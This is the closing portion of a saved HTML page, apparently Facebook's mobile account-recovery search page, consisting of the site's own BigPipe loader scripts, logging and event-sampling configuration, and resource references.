            ]
        });
    }));
    </script>
    <script>
    requireLazy(["__bigPipe"], function(bigPipe) {
        bigPipe.setPageID("7071503091402037698-0")
    });
    CavalryLogger.setPageID("7071503091402037698-0");
    </script>
    <script nonce="">
    (function() {
        var n = now_inl();
        requireLazy(["__bigPipe"], function(bigPipe) {
            bigPipe.beforePageletArrive("last_response", n);
        })
    })();
    </script>
    <script nonce="">
    requireLazy(["__bigPipe"], (function(bigPipe) {
        bigPipe.onPageletArrive({
            id: "last_response",
            phase: 63,
            last_in_phase: true,
            the_end: true,
            jsmods: {
                define: [
                    ["MTouchableSyntheticClickGK", [], {
                        USE_SYNTHETIC_CLICK: true
                    }, 368],
                    ["BrowserPaymentHandlerConfig", [], {
                        enabled: false
                    }, 3904],
                    ["cr:334", ["ghlTestUBTFacebook"], {
                        __rc: ["ghlTestUBTFacebook",
                            "Aa0J7UgwsQbyFE25QtYblzFgJVpeMQX4jxZs1YmLcJFwPoxWsfc63-mOPpRuiUaK5P9nAWAbhcSgFHapSO84q457DA"
                        ]
                    }, -1],
                    ["cr:1088657", [], {
                        __rc: [null,
                            "Aa1miK618A8IQLBKoM2A8pnkpg9NRJLtywQwPvfRbxY8MsYpmbRUZinuUxGkKaSL9tW3zWtjryir6SIU1BByWf4"
                        ]
                    }, -1],
                    ["cr:1543261", [], {
                        __rc: [null,
                            "Aa3UDkFpbd9xBCWHykNYNfGNrcQ8Tjm9ooI6sjRH0NF9Kaf3OadLn0910LDuYQsjDpUhs5nh187AftOvoURLUoTP"
                        ]
                    }, -1],
                    ["cr:708886", ["EventProfilerImpl"], {
                        __rc: ["EventProfilerImpl",
                            "Aa3Ivo6rLLUH3e7binKRnOsrp9OVXuAHRhnx6fhqINdwMLPcZngd1AVb8M63cxS7_SKoW3PRKIUBm9nPCSomyH01OG0"
                        ]
                    }, -1],
                    ["cr:1094907", [], {
                        __rc: [null,
                            "Aa3Ku237ftTjdnGDiQwEftibChvPvk9JpuiCdr92perYcHGh5MUOCg8oWBcrxA3Mw898XwcMC7dfAThzGLLFil0"
                        ]
                    }, -1],
                    ["EventConfig", [], {
                        sampling: {
                            bandwidth: 0,
                            play: 0,
                            playing: 0,
                            progress: 0,
                            pause: 0,
                            ended: 0,
                            seeked: 0,
                            seeking: 0,
                            waiting: 0,
                            loadedmetadata: 0,
                            canplay: 0,
                            selectionchange: 0,
                            change: 0,
                            timeupdate: 0,
                            adaptation: 0,
                            focus: 0,
                            blur: 0,
                            load: 0,
                            error: 0,
                            message: 0,
                            abort: 0,
                            storage: 0,
                            scroll: 200000,
                            mousemove: 20000,
                            mouseover: 10000,
                            mouseout: 10000,
                            mousewheel: 1,
                            MSPointerMove: 10000,
                            keydown: 0.1,
                            click: 0.02,
                            mouseup: 0.02,
                            __100ms: 0.001,
                            __default: 5000,
                            __min: 100,
                            __interactionDefault: 200,
                            __eventDefault: 100000
                        },
                        page_sampling_boost: 1,
                        interaction_regexes: {},
                        interaction_boost: {},
                        event_types: {},
                        manual_instrumentation: false,
                        profile_eager_execution: false,
                        disable_heuristic: true,
                        disable_event_profiler: false
                    }, 1726],
                    ["IntlCurrentLocale", [], {
                        code: "en_US"
                    }, 5954],
                    ["KillabyteProfilerConfig", [], {
                        htmlProfilerModule: null,
                        profilerModule: null,
                        depTypes: {
                            BL: "bl",
                            NON_BL: "non-bl"
                        }
                    }, 1145],
                    ["QuicklingConfig", [], {
                        version: "1005153370;0;",
                        sessionLength: 30,
                        inactivePageRegex: "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",
                        badRequestKeys: ["nonce", "access_token", "oauth_token", "xs",
                            "checkpoint_data", "code"
                        ],
                        logRefreshOverhead: false
                    }, 60]
                ],
                require: [
                    ["BDClientSignalCollectionTrigger", "startSignalCollection", [],
                        [{
                            sc: "{\"t\":1637128278,\"c\":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}",
                            fds: 60,
                            fda: 60,
                            i: 60,
                            sbs: 1,
                            dbs: 100,
                            bbs: 100,
                            hbi: 60,
                            rt: 262144,
                            hbcbc: 2,
                            hbvbc: 0,
                            hbbi: 30,
                            sid: -1,
                            hbv: "5486389351465111835"
                        }]
                    ],
                    ["NavigationMetrics", "setPage", [],
                        [{
                            page: "XNameSearchLoginController",
                            page_type: "normal",
                            page_uri: "https://m.facebook.com/login/account_recovery/name_search/?cuid=AYjwrxJroWAIdjzVB8hoUa6ycnrvPSBo8M748hjwPACnFLPFkWo9mnhIyrbuKsg8mW05QATm8VocOb9H_4mNe5vFHaMlq2tUdrTa8Tk5lpS8TgTpAU0worIXYQhIMbfzBeRdY2aYavrq0bpDmXrbX_GIpfQ317ZtoRXsvY-bBYTiUxc1C3JmKvbXcHZOZ0MVon5OHgg7akHUhnH1ob7155FXyurRF3ORULTAVbrz9awqeQ&flow=ncpfar&ls=no_cp_for_ar&c=https%3A%2F%2Fm.facebook.com%2F&_rdr",
                            serverLID: "7071503091402037698-0"
                        }]
                    ],
                    ["CavalryLoggerImpl", "startInstrumentation", [],
                        []
                    ],
                    ["ServiceWorkerURLCleaner", "removeRedirectID", [],
                        []
                    ]
                ]
            },
            hsrp: {
                hsdp: {
                    clpData: {
                        "1743095": {
                            r: 1,
                            s: 1
                        }
                    },
                    gkxData: {
                        "1652843": {
                            result: false,
                            hash: "AT6uh9NWRY4QEQoYxJA"
                        }
                    }
                },
                hblp: {
                    consistency: {
                        rev: 1005153370
                    },
                    rsrcMap: {
                        t1KEUNA: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/HRoaPibbahM.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        FEt5GzN: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/cN-N4Eu_deZ.js?_nc_x=Ij3Wp8lg5Kz"
                        }
                    }
                }
            },
            allResources: ["t1KEUNA", "V7S7y8z", "FEt5GzN", "rSSg6U2"],
            onload: [
                "CavalryLogger.getInstance(\"7071503091402037698-0\").setTTIEvent(\"t_domcontent\");"
            ],
            onafterload: [
                "window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp(\"t_paint\");",
                "if (window.ExitTime){CavalryLogger.getInstance(\"7071503091402037698-0\").setValue(\"t_exit\", window.ExitTime);};"
            ]
        });
    }));
    </script>
    <div class="AdBox Ad advert post-ads"></div>
    <div class="sponsorPost"></div>
</body>

</html>